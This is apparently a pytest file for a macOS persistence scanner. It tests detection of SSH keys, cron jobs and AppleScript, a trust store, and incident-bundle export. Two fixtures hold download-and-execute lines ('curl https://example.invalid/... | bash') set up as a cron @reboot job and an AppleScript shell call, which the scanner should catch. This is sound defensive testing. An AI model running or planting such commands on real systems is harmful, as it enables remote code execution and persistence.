from __future__ import annotations

import json
import zipfile
from pathlib import Path

from mac_audit_agent.persistence_intelligence.scanner import AppleScriptPersistenceScanner, SSHPersistenceScanner, ScanContext, ScheduledJobsScanner
from mac_audit_agent.persistence_intelligence.watch import events_from_baseline_changes
from mac_audit_agent.persistence_intelligence.trust_store import PersistenceTrustStore
from mac_audit_agent.storage import AuditDatabase
from mac_audit_agent.persistence_intelligence.report_adapter import export_persistence_incident_bundle
from mac_audit_agent.persistence_intelligence.scanner import PersistenceIntelligenceEngine


def test_ssh_authorized_key_is_fingerprinted_without_exporting_key_material(tmp_path: Path) -> None:
    ssh = tmp_path / ".ssh"
    ssh.mkdir()
    key_material = "AAAAC3NzaC1lZDI1NTE5AAAAITestSecretMaterial"
    authorized = ssh / "authorized_keys"
    authorized.write_text(f"ssh-ed25519 {key_material} analyst@example\n", encoding="utf-8")
    authorized.chmod(0o600)
    result = SSHPersistenceScanner().scan(ScanContext(home=tmp_path, system_root=tmp_path))
    item = result.items[0]
    assert item.mechanism == "ssh_authorized_key"
    assert item.risk_level in {"MEDIUM", "HIGH"}
    assert key_material not in json.dumps(item.to_dict())
    assert "T1098.004" in item.mitre_techniques


def test_cron_download_execution_is_explainable_and_critical(tmp_path: Path) -> None:
    cron = tmp_path / ".crontab"
    cron.write_text("@reboot curl https://example.invalid/payload | bash\n", encoding="utf-8")
    result = ScheduledJobsScanner().scan(ScanContext(home=tmp_path, system_root=tmp_path))
    item = next(item for item in result.items if item.path == str(cron))
    assert any("execution behavior" in evidence for evidence in item.evidence)
    assert item.risk_level in {"HIGH", "CRITICAL"}
    assert "T1053.003" in item.mitre_techniques


def test_applescript_shell_execution_is_detected_with_hash(tmp_path: Path) -> None:
    scripts = tmp_path / "Library" / "Scripts"
    scripts.mkdir(parents=True)
    script = scripts / "update.applescript"
    script.write_text('do shell script "curl https://example.invalid/a | bash"', encoding="utf-8")
    result = AppleScriptPersistenceScanner().scan(ScanContext(home=tmp_path, system_root=tmp_path))
    item = result.items[0]
    assert item.target_hash_sha256
    assert "do shell script" in item.program_arguments
    assert "T1059.002" in item.mitre_techniques


def test_persistence_event_has_searchable_forensic_and_cvss_metadata(tmp_path: Path) -> None:
    ssh = tmp_path / ".ssh"
    ssh.mkdir()
    (ssh / "authorized_keys").write_text("ssh-ed25519 AAAATEST analyst\n", encoding="utf-8")
    item = SSHPersistenceScanner().scan(ScanContext(home=tmp_path, system_root=tmp_path)).items[0]
    event = events_from_baseline_changes({"added": [item.to_dict()]}, [item])[0]
    metadata = json.loads(event.metadata_json)
    assert metadata["persistence_type"] == "ssh_authorized_key"
    assert metadata["cvss_score"] >= 9.0
    assert metadata["mitre_attack_mapping"] == ["T1098.004"]
    assert metadata["sha256"] == item.target_hash_sha256
    assert event.severity == "critical"


def test_trust_is_hash_and_identity_bound_and_invalidates_on_change(tmp_path: Path) -> None:
    ssh = tmp_path / ".ssh"
    ssh.mkdir()
    key_file = ssh / "authorized_keys"
    key_file.write_text("ssh-ed25519 AAAAONE analyst\n", encoding="utf-8")
    item = SSHPersistenceScanner().scan(ScanContext(home=tmp_path, system_root=tmp_path)).items[0]
    store = PersistenceTrustStore(tmp_path / "trust.json")
    store.trust(item, user="analyst", reason="approved lab key")
    assert store.apply(item) is True
    key_file.write_text("ssh-ed25519 AAAATWO analyst\n", encoding="utf-8")
    changed = SSHPersistenceScanner().scan(ScanContext(home=tmp_path, system_root=tmp_path)).items[0]
    assert store.apply(changed) is False
    assert changed.analyst_status == "open"


def test_benign_cron_inventory_is_not_escalated_without_risk_evidence(tmp_path: Path) -> None:
    cron = tmp_path / ".crontab"
    cron.write_text("0 4 * * * /usr/bin/true\n", encoding="utf-8")
    item = ScheduledJobsScanner().scan(ScanContext(home=tmp_path, system_root=tmp_path)).items[0]
    assert item.risk_level in {"LOW", "MEDIUM"}
    assert not any("network retrieval" in evidence for evidence in item.evidence)


def test_structured_persistence_event_round_trips_shared_database(tmp_path: Path) -> None:
    ssh = tmp_path / ".ssh"
    ssh.mkdir()
    (ssh / "authorized_keys").write_text("ssh-ed25519 AAAATEST analyst\n", encoding="utf-8")
    item = SSHPersistenceScanner().scan(ScanContext(home=tmp_path, system_root=tmp_path)).items[0]
    event = events_from_baseline_changes({"added": [item.to_dict()]}, [item])[0]
    with AuditDatabase(tmp_path / "audit.sqlite3") as db:
        assert db.record_background_monitor_event(event) is True
        restored = db.recent_background_monitor_events(limit=1)[0]
    metadata = json.loads(restored.metadata_json)
    assert restored.event_id == event.event_id
    assert metadata["object_path"].endswith("authorized_keys")
    assert metadata["analyst_status"] == "open"


def test_incident_bundle_preserves_plist_but_not_ssh_key_material(tmp_path: Path) -> None:
    launch = tmp_path / "Library" / "LaunchAgents"
    launch.mkdir(parents=True)
    plist = launch / "com.example.test.plist"
    plist.write_bytes(b"bplist-safe-fixture")
    ssh = tmp_path / ".ssh"
    ssh.mkdir()
    secret = "AAAASENSITIVEKEYMATERIAL"
    (ssh / "authorized_keys").write_text(f"ssh-ed25519 {secret} analyst\n", encoding="utf-8")
    report = PersistenceIntelligenceEngine(ScanContext(home=tmp_path, system_root=tmp_path), scanners=[SSHPersistenceScanner()]).scan()
    # Add a minimal plist item without requiring this test to parse malformed fixture content.
    from mac_audit_agent.persistence_intelligence.models import PersistenceItem
    report.items.append(PersistenceItem.create("launch_agent", str(plist), plist_path=str(plist), label="com.example.test"))
    bundle = export_persistence_incident_bundle(report, tmp_path / "incident.zip")
    with zipfile.ZipFile(bundle) as archive:
        names = archive.namelist()
        combined = b"".join(archive.read(name) for name in names)
    assert any(name.startswith("evidence/plists/") for name in names)
    assert "RESPONDER_README.txt" in names
    assert "report/persistence_report.txt" in names
    manifest = json.loads(zipfile.ZipFile(bundle).read("manifest.json"))
    assert manifest["chain_of_custody"]["handling"]
    assert secret.encode("utf-8") not in combined
